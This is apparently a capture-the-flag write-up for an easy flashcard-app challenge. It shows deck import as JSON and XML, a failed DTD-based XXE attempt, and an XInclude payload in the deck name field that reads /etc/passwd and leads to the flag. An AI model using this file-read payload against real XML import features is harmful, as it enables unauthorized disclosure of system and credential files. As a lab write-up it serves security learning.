# Tanuki

Level: Easy\
Points: 10\
Type: Daily Challenge

We have option to import decks

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

The thing that directly picks my eye is ability to import deck in XML format.

To gen an idea about the overall flow, I downloaded the provided sample json file and uploaded it.

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

```
{
  "name": "Sample Deck",
  "description": "A sample deck showing the import format for custom flashcards",
  "category": "Example",
  "cards": [
    {
      "front": "What is the capital of France?",
      "back": "Paris - the city of lights and capital of France since 987 AD."
    },
    {
      "front": "What programming language is this app built with?",
      "back": "JavaScript - using Node.js for backend and React for frontend."
    },
    {
      "front": "What is a flashcard?",
      "back": "A flashcard is a learning tool that presents information on both sides, typically a question on one side and an answer on the other."
    },
    {
      "front": "What does SRS stand for?",
      "back": "Spaced Repetition System - a learning technique that uses increasing intervals of time between reviews of previously learned material."
    },
    {
      "front": "How do you create a custom deck?",
      "back": "Download this sample file, edit the name, description, category, and cards array with your own content, then upload it using the Import Deck feature."
    }
  ]
}
```

Next, I tried to understand the XML import flow, for this I used deep seek to convert above json to XML

```
<?xml version="1.0" encoding="UTF-8"?>
<deck>
  <name>Sample Deck</name>
  <description>A sample deck showing the import format for custom flashcards</description>
  <category>Example</category>
  <cards>
    <card>
      <front>What is the capital of France?</front>
      <back>Paris - the city of lights and capital of France since 987 AD.</back>
    </card>
    <card>
      <front>What programming language is this app built with?</front>
      <back>JavaScript - using Node.js for backend and React for frontend.</back>
    </card>
    <card>
      <front>What is a flashcard?</front>
      <back>A flashcard is a learning tool that presents information on both sides, typically a question on one side and an answer on the other.</back>
    </card>
    <card>
      <front>What does SRS stand for?</front>
      <back>Spaced Repetition System - a learning technique that uses increasing intervals of time between reviews of previously learned material.</back>
    </card>
    <card>
      <front>How do you create a custom deck?</front>
      <back>Download this sample file, edit the name, description, category, and cards array with your own content, then upload it using the Import Deck feature.</back>
    </card>
  </cards>
</deck>
```

and it is successfully imported:\
Note: edit the file extension and content-type during upload

<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

To make it easier to work with, I compacted the XML length, keeping card count to only one

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

From here I tried to use various XXE payload from [https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)

<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Default payload with `<!DOCTYPE>` gave some error which highlight, the backend XML parsers migh disable DTD processing by default because it's a major security risk. When DTD is disabled:

* `<!DOCTYPE>` declarations are ignored or cause errors
* External entities are never resolved
* The parser essentially says "I see this, but I'm not allowed to process it"

To bypass this I used `XInclude` payload from [https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html?highlight=xml#xinclude](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html?highlight=xml#xinclude)

### What is XInclude?

**XInclude (XML Inclusions)** is a W3C specification that allows XML documents to include content from external sources. It's a separate feature from XML's DTD-based external entities.

```
<?xml version="1.0" encoding="UTF-8"?>
<deck xmlns:xi="http://www.w3.org/2001/XInclude">
  <name><xi:include href="file:///etc/passwd" parse="text"/></name>
  <description>A sample deck showing the import format for custom flashcards</description>
  <category>Example</category>
  <cards>
    <card>
      <front>What is the capital of France?</front>
      <back>Paris - the city of lights and capital of France since 987 AD.</back>
    </card>
</deck>
```

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Then I opened the imported dec

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The payload works and loads the content of `/etc/passwd` \[Flag is somewhere else]

after little of search, I found the flag in current directory

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
